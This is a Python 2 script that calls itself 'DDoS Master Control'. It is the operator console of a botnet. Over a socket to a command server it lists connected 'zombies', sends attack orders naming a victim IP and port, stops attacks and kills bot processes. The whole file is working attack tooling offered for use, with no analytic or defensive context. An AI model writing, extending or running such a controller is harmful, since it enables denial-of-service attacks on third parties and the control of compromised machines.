#coding: utf-8
import socket
import sys
import os
def printmenu(status):
    os.system('clear')
    print "================================="
    print "====== DDoS Master Control ======"
    print "================================="
    print ""
    print "Commands:"
    print "List all zombies connected\t[list]"
    print "Send attack command\t\t[attack]"
    print "Send stop command\t\t[stop]"
    print "Kill a zombie process\t\t[kill]"
    print "Close connection from server\t[die]"
    print ""
    print "========== Status: " + status + " =========="
    print "\n\n--> ",
    return str(raw_input())

def receivemessage(socket):
    data = socket.recv(1024)
    if not data:
        print 'Connection closed'
        sys.exit()
    else:
        #print data
        sys.stdout.write("Server Response: " + data + "\n")
        return data

#main function
if __name__ == "__main__":

    if len(sys.argv) < 3:
        print 'Usage : python telnet.py hostname port'
        sys.exit()

    host = sys.argv[1]
    port = int(sys.argv[2])

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)

    # connect to remote host
    try :
        s.connect((host, port))
    except :
        print 'Unable to connect'
        sys.exit()

    print 'Connected to remote host'

    alive = 1
    status = "Idle"
    try:
        while alive:
            #Print options menu
            option = printmenu(status)
            #List zombies command
            if option == "list":
                s.send("list")
                receivemessage(s)
            #Start attack command
            elif option == "attack":
                print "Insert victim ip and port: ",
                victim = str(raw_input())
                s.send("attack " + victim)
                status = "Attacking!"
                receivemessage(s)
            #Stop attack command
            elif option == "stop":
                s.send("stop")
                status = "Attack stopped"
                receivemessage(s)
            elif option == "kill":
                s.send("list")
                receivemessage(s)
                print "Insert zombie id to kill: ",
                zombie_id = raw_input()
                s.send("kill " + zombie_id)
            #Finish program
            elif option == "die":
                if status == "Attacking!":
                    s.send("stop")
                s.send("die")
                receivemessage(s)
                alive = 0
            else:
                print "Invalid option."

            raw_input("Press Enter to continue...")
    except KeyboardInterrupt:
        # Fim do programa
        if status == "Attacking!":
            s.send("stop")
        print "Disconnecting..."
        s.send("die")
        sys.exit()
    except Exception as ex:
        # Fim do programa
        print ex
        if status == "Attacking!":
            s.send("stop")
        s.send("die")
        sys.exit()
